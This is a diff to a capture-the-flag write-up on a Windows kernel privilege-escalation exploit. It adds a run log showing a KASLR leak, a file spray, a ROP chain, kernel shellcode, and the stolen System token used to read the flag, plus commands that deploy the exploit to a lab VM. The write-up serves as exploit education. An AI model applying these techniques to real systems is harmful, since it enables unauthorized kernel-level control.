@@ -537,7 +537,40 @@ found:
 
 After returning to `IopfCallDriver` we never signaled that the paging operation has completed, so the kernel politely hangs the faulting thread in `MiWaitForInPageComplete` -> `KeWaitForSingleObject`. Then from a separate thread we wait for long enough that we are sure our TOKEN has been replaced with System TOKEN, and invoke `C:\Windows\ReadFlag.exe` to get the flag.
 
-```text open
+```text open filename="QEMU handout"
+sshpass -p Password123_ scp -P 3000 -q exploit lowpriv@localhost:exploit.exe
+sshpass -p Password123_ ssh -p 3000 -q lowpriv@localhost exploit.exe || rm exploit
+thread handle = 00000000000000C0, tid = 1416
+waiting...
+hi!
+flag?
+found = 1
+LSTAR is most likely: fffff80176b23200
+kbase = fffff80175f70000
+hDevice handle = 00000000000000C4
+hFile handle = 0000000000004154
+avg mapped = 58
+avg unmapped = 102
+threshold = 80
+mapping handle = 0000000000004158
+ok: 1
+ok: 1
+file spray done
+setup rop chain
+closing
+views mapped
+kernel_shellcode = 8d102f
+starting...
+flag?
+flag?
+flag?
+flag?
+plfanzen{hautpeingang}
+
+done
+```
+
+```text open filename="VMWare (with custom flag disk)"
 zig cc exploit.c exploit.s -o exploit -target x86_64-windows-gnu -DDEBUG=0 -O2 -masm=intel -g3 -flto
 sshpass -p Password123_ scp -q exploit lowpriv@172.16.60.132:exploit.exe
 sshpass -p Password123_ ssh -q lowpriv@172.16.60.132 exploit.exe || rm exploit
